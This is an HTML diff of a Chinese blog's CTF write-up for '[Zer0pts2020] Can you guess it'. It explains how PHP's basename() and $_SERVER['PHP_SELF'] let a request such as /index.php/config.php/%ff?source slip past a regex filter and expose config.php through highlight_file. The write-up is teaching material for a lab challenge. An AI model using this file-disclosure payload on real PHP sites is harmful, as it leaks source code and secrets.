@@ -27,16 +27,16 @@
 
   
   
-    <meta name="description" content="知识点：1234567891011$_SERVER[&#x27;PHP_SELF&#x27;] 包含了当前执行脚本的文件路径&#x2F;index.php&#x2F;index.php&#x2F;aaa.php这两种访问的都是index.php，可能是因为aaa.php不存在basename()可以理解为对传入的参数路径截取最后一段作为返回值，但是该函数发现最后一段为不可见字符时会退取上一层的目录$var1&#x3D;&quot;&#x2F;co">
+    <meta name="description" content="知识点： 1234567891011$_SERVER[&#x27;PHP_SELF&#x27;] 包含了当前执行脚本的文件路径&#x2F;index.php&#x2F;index.php&#x2F;aaa.php这两种访问的都是index.php，可能是因为aaa.php不存在basename()可以理解为对传入的参数路径截取最后一段作为返回值，但是该函数发现最后一段为不可见字符时会退取上一层的目录$var1&#x3D;&quot;&#x2F;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[Zer0pts2020]Can you guess it">
 <meta property="og:url" content="http://example.com/2025/03/31/[Zer0pts2020]Can%20you%20guess%20it/index.html">
 <meta property="og:site_name" content="KL">
-<meta property="og:description" content="知识点：1234567891011$_SERVER[&#x27;PHP_SELF&#x27;] 包含了当前执行脚本的文件路径&#x2F;index.php&#x2F;index.php&#x2F;aaa.php这两种访问的都是index.php，可能是因为aaa.php不存在basename()可以理解为对传入的参数路径截取最后一段作为返回值，但是该函数发现最后一段为不可见字符时会退取上一层的目录$var1&#x3D;&quot;&#x2F;co">
+<meta property="og:description" content="知识点： 1234567891011$_SERVER[&#x27;PHP_SELF&#x27;] 包含了当前执行脚本的文件路径&#x2F;index.php&#x2F;index.php&#x2F;aaa.php这两种访问的都是index.php，可能是因为aaa.php不存在basename()可以理解为对传入的参数路径截取最后一段作为返回值，但是该函数发现最后一段为不可见字符时会退取上一层的目录$var1&#x3D;&quot;&#x2F;">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-03-31T12:18:23.000Z">
-<meta property="article:modified_time" content="2025-03-31T12:35:29.687Z">
-<meta property="article:author" content="fuboy">
+<meta property="article:modified_time" content="2025-04-19T08:34:50.164Z">
+<meta property="article:author" content="FuB0Y">
 <meta property="article:tag" content="php特性">
 <meta property="article:tag" content="basename()">
 <meta name="twitter:card" content="summary">
@@ -51,6 +51,14 @@
 <link rel="stylesheet" href="/css/style.css">
 
   <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
   
   
   
@@ -196,20 +204,20 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">知识点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">题目分析：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">3.</span> <span class="toc-text">payload</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text"> 知识点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text"> 题目分析：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">3.</span> <span class="toc-text"> payload</span></a></li></ol>
       
   </div>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
-  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
-  <div class="sidebar-author-name">fuboy</div>
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
   <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">85</div>
+    <div class="sidebar-state-number">186</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -217,7 +225,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">179</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -282,7 +290,7 @@
       <div class="article-date">
   <a href="/2025/03/31/%5BZer0pts2020%5DCan%20you%20guess%20it/" class="article-date-link" data-aos="zoom-in">
     <time datetime="2025-03-31T12:18:23.000Z" itemprop="datePublished">2025-03-31</time>
-    <time style="display: none;" id="post-update-time">2025-03-31</time>
+    <time style="display: none;" id="post-update-time">2025-04-19</time>
   </a>
 </div>
 
@@ -299,31 +307,25 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;] 包含了当前执行脚本的文件路径</span><br><span class="line">/index.php</span><br><span class="line">/index.php/aaa.php</span><br><span class="line">这两种访问的都是index.php，可能是因为aaa.php不存在</span><br><span class="line"></span><br><span class="line">basename()</span><br><span class="line">可以理解为对传入的参数路径截取最后一段作为返回值，但是该函数发现最后一段为不可见字符时会退取上一层的目录</span><br><span class="line">$var1=&quot;/config.php/test&quot;</span><br><span class="line">basename($var1)	=&gt; test</span><br><span class="line">$var2=&quot;/config.php/%ff&quot;</span><br><span class="line">basename($var2)	=&gt;	config.php</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="题目分析："><a href="#题目分析：" class="headerlink" title="题目分析："></a>题目分析：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;config.php&#x27;; // FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">  $guess = (string) $_POST[&#x27;guess&#x27;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message = &#x27;Wrong.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
+        <h2 id="知识点"><a class="markdownIt-Anchor" href="#知识点"></a> 知识点：</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;] 包含了当前执行脚本的文件路径</span><br><span class="line">/index.php</span><br><span class="line">/index.php/aaa.php</span><br><span class="line">这两种访问的都是index.php，可能是因为aaa.php不存在</span><br><span class="line"></span><br><span class="line">basename()</span><br><span class="line">可以理解为对传入的参数路径截取最后一段作为返回值，但是该函数发现最后一段为不可见字符时会退取上一层的目录</span><br><span class="line">$var1=&quot;/config.php/test&quot;</span><br><span class="line">basename($var1)	=&gt; test</span><br><span class="line">$var2=&quot;/config.php/%ff&quot;</span><br><span class="line">basename($var2)	=&gt;	config.php</span><br></pre></td></tr></table></figure>
+<h2 id="题目分析"><a class="markdownIt-Anchor" href="#题目分析"></a> 题目分析：</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;config.php&#x27;; // FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">  $guess = (string) $_POST[&#x27;guess&#x27;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message = &#x27;Wrong.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>这题看似是要我们猜出这个生成随机数，然后就能输出config.php中的flag</p>
 <p>但尝试了很久发现根本猜不出</p>
 <p>那我们再向前看</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line">//$_SERVER[&#x27;PHP_SELF&#x27;] 包含了当前执行脚本的文件路径</span><br><span class="line">//basename() 是 PHP 中的一个函数，用于从文件路径中提取文件名。它接受一个文件路径作为参数，并返回路径的最后一部分，即文件名</span><br><span class="line">例：/path/to/example.php--&gt;example.php</span><br></pre></td></tr></table></figure>
-
 <p>这里还有个highlight_file可以读取文件</p>
 <p>是不是我们只要把config.php读出来就行了呢</p>
 <p><strong>$_SERVER[‘PHP_SELF’]</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/index.php</span><br><span class="line">/index.php/aaa.php</span><br><span class="line">这两种访问的都是index.php，可能是因为aaa.php不存在</span><br></pre></td></tr></table></figure>
-
 <p><strong>basename()</strong></p>
 <p>可以理解为对传入的参数路径截取最后一段作为返回值，但是该函数发现最后一段为不可见字符时会退取上一层的目录</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$var1=&quot;/config.php/test&quot;</span><br><span class="line">basename($var1)	=&gt; test</span><br><span class="line">$var2=&quot;/config.php/%ff&quot;</span><br><span class="line">basename($var2)	=&gt;	config.php</span><br></pre></td></tr></table></figure>
-
-<p><code>preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])</code></p>
+<p><code>preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这个正则匹配了config.php/为$_SERVER[‘PHP_SELF’]的结尾</span><br><span class="line">其实这个不用管</span><br><span class="line">因为我们需要在config.php/后面加个%ff?source，这样才能回显代码</span><br></pre></td></tr></table></figure>
-
-<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/config.php/%ff?source</span><br></pre></td></tr></table></figure>
-
+<h2 id="payload"><a class="markdownIt-Anchor" href="#payload"></a> payload</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/config.php/%ff?source</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -396,7 +398,7 @@
       <span class="icon-copyright"></span>
       2020-2025
       <span class="footer-info-sep rotate"></span>
-      fuboy
+      FuB0Y
     </div>
     
       <div>
@@ -407,10 +409,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        115.8k
+        284k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        07:58
+        20:48
       </div>
     
     
@@ -442,20 +444,20 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">知识点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">题目分析：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">3.</span> <span class="toc-text">payload</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text"> 知识点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text"> 题目分析：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">3.</span> <span class="toc-text"> payload</span></a></li></ol>
       
   </div>
 </div>
 </div>
       <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
-  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
-  <div class="sidebar-author-name">fuboy</div>
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
   <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">85</div>
+    <div class="sidebar-state-number">186</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -463,7 +465,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">179</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -583,14 +585,14 @@
       
       <script data-pjax>
         window.REIMU_POST = {
-          author: "fuboy",
+          author: "FuB0Y",
           title: "[Zer0pts2020]Can you guess it",
           url: "http://example.com/2025/03/31/[Zer0pts2020]Can%20you%20guess%20it/",
           excerpt: "",
           description: "",
-          stripContent: "知识点：1234567891011$_SERVER[&amp;#x27;PHP_SELF&amp;#x27;] 包含了当前执行脚本的文件路径/index.php/index.php/aaa.php这两种访问的都是index.php，可能是因为aaa.php不存在basename()可以理解为对传入的参数路径截取最后一段作为返回值，但是该函数发现最后一段为不可见字符时会退取上一层的目录$var1=&amp;quot;/config.php/test&amp;quot;basename($var1) =&amp;gt; test$var2",
+          stripContent: " 知识点： 1234567891011$_SERVER[&amp;#x27;PHP_SELF&amp;#x27;] 包含了当前执行脚本的文件路径/index.php/index.php/aaa.php这两种访问的都是index.php，可能是因为aaa.php不存在basename()可以理解为对传入的参数路径截取最后一段作为返回值，但是该函数发现最后一段为不可见字符时会退取上一层的目录$var1=&amp;quot;/config.php/test&amp;quot;basename($var1) =&amp;gt; test$va",
           date: "Mon Mar 31 2025 20:18:23 GMT+0800",
-          updated: "Mon Mar 31 2025 20:35:29 GMT+0800",
+          updated: "Sat Apr 19 2025 16:34:50 GMT+0800",
           cover: "/../images/17384736097c9d.jpg",
         };
       </script>
@@ -678,6 +680,15 @@
 </script>
 
 
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
 
 
 
